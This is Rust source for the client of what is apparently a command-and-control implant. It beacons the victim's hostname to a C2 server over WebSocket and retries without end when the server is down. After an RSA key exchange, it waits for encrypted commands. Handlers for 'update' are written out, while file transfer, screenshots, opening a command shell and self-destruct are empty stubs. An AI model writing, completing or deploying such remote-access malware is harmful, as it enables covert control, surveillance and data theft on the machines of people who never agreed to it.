mod feature;
mod hybrid_decryption;

use std::time::Duration;

use feature::{update::Update, Feature};
use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use gethostname::gethostname;
use hybrid_decryption::HybridDecryption;
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use tokio_tungstenite::{
    connect_async,
    tungstenite::{handshake::client::Response, Message},
    WebSocketStream,
};
pub struct Connector {
    //Server address sends data to main server
    address_server: String,
    write: Option<
        SplitSink<
            WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
            Message,
        >,
    >,
    read: Option<
        SplitStream<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>,
    >,
    public_key: Option<RsaPublicKey>,
    private_key: RsaPrivateKey,
}
impl Connector {
    pub fn new(address_server: String) -> Self {
        Connector {
            address_server,
            write: None,
            read: None,
            public_key: None,
            private_key: generate_private_key(),
        }
    }
    pub async fn send_data(&mut self, data: String, response: Response) {
        match &self
            .write
            .as_mut()
            .unwrap()
            .send(Message::Text(data.into()))
            .await
        {
            Ok(_) => println!("Message sent successfully"),
            Err(e) => {
                println!("Connected to the server");
                println!("Response HTTP code: {}", response.status());
                println!("Response contains the following headers:");
                for (header, _value) in response.headers() {
                    println!("* {header}");
                }
                eprintln!("Failed to send message: {}", e)
            }
        }
    }

    pub async fn search_for_c2(&mut self) {
        match connect_async(&self.address_server).await {
            Ok((ws_stream, response)) => {
                let (write, read) = ws_stream.split();
                self.write = Some(write);
                self.read = Some(read);
                println!("Connected to the server");
                self.send_data(
                    format!("ping|{}", gethostname().into_string().unwrap()),
                    response,
                )
                .await;
                if let Some(message) = self.read.as_mut().unwrap().next().await {
                    //Debug
                    //println!("{}", message.unwrap());
                    self.init_server(&message.unwrap().to_string()).await;
                }
                //when recieved a pong subscribe for updates
            }
            //make it keep trying
            Err(e) => {
                eprintln!("Failed to connect: {} the server is probably down", e);
                //wait for 6 min to try to connect again
                tokio::time::sleep(Duration::from_secs(6)).await;
                Box::pin(self.search_for_c2()).await;
            }
        }
    }
    pub async fn subscribe_to_updates(&mut self) {
        loop {
            let decrypted_message = self.accept_encrypted_message().await;
            match decrypted_message.as_str() {
                "update" => {
                    println!("got an update request");
                    let update = Update::new();
                    //send callback
                    match update.run(self).await {
                        feature::Result::SUCCESFUL => {}
                        feature::Result::FAILED => {}
                    }
                }
                "start_file_transfer" => {}
                "send_screenshot" => {}
                "open_cmd" => {}
                "self_destruct" => {}
                _ => {
                    println!("Got unrecognisible command, message:{}", decrypted_message)
                }
            }
        }
    }

    pub async fn init_server(&mut self, message_str: &str) {
        if message_str == "pong" {
            let public_key_string = self
                .private_key
                .to_public_key()
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap();

            self.write
                .as_mut()
                .unwrap()
                .send(Message::from(public_key_string))
                .await
                .unwrap();

            let decrypted_message = self.accept_encrypted_message().await;
            self.public_key = Some(RsaPublicKey::from_pkcs1_pem(&decrypted_message).unwrap());
            println!("rsa init sequence complete");

            self.subscribe_to_updates().await;
        }
    }
    pub fn decrypt_data(&self, data: &[u8]) -> String {
        let decrypted_data = self
            .private_key
            .decrypt(Pkcs1v15Encrypt, hex::decode(data).unwrap().as_slice())
            .unwrap();
        String::from_utf8(decrypted_data).unwrap()
    }
    pub async fn accept_encrypted_message(&mut self) -> String {
        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
        for index in 0..3 {
            if let Some(message) = self.read.as_mut().unwrap().next().await {
                //cant put hex decode in the decrypt fn cuz it cant accept
                hybrid_decryption_arguments[index] =
                    hex::decode(message.unwrap().to_string()).unwrap();
            }
        }
        let hybrid_decryption = HybridDecryption::new(
            hybrid_decryption_arguments[0].clone(),
            hybrid_decryption_arguments[1].clone(),
            hybrid_decryption_arguments[2].clone(),
        );
        hybrid_decryption.decrypt(self.private_key.clone())
    }
}
pub fn generate_private_key() -> RsaPrivateKey {
    let mut rng = rand::thread_rng();
    let bits = 2048;
    RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
}
